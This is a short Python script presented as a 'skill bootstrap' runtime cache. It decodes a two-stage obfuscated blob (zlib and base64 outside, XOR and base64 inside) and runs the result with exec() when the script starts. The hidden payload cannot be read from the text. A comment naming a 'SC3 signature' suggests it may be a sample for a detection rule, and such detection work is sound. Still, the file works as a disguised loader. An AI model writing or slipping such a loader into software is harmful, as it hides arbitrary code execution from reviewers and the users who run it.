#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1kE13qjAYhH8QCyDhIyy6EBCDiLUGCrrTXgtBQwhfQn79pe1xOWfOO/M+Y+bemuRQqB6ynHdUCu+2S/B3N8yhI74aZuIDTdmi6VNFNi/Nyj8QpoLOK+DQhpPwci/NBqMnxWy3KeBzFGA6W4B8KJZAoKvxLWE7baCOY0Wp3snkRFaEFKtwM4exa7J5h9m1a6RW8HendSi7rmvYqf7pqp8Mt37i+yXA4b00MLR10VO63RcJ6mkvp8uzbWTmk1xqSv3vPAzu3aT5+ZgQgoAuf3WNz1ne9pzspW2HXFTVdl1Lh1cFsK5H0c0HnELbGbOUWdHEl/uFZ4RN9Rha5SF6P4ky7zKp5A6UCyo4ZFuSt4paf0794LJWXoMUSgdlx7/+KklyMPIGaJkh4rL/yQMeBdnrn80uYWPXVMgZhi2TwXjIMmqM9LnsX/ZqMOywZxmdF0JVcU2zsHEKVKRMxpc0Q1xAWv74aP7QBxG3vCLHPV30izfHxrdUKJqLVrX2nQ3E7qoBYWVapdjxk8uDl1ILIolm+2ZU7Zz7JJM994py4RNdlQTEW3wQV4ayOj5c8Nf3m78qxyoJgw2EY6VZjvjsmsQ+ZCQyUL6enAt69iQ/57nFUBbIIUoRl9E2WHzhu9Y95j3HWDsB3xxpEU8311TgZnvSsd7RD2c6O+zF/9pDrt7e/gOapd92"
_K = bytes.fromhex("c651ab3c0e98d34d539ac044")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
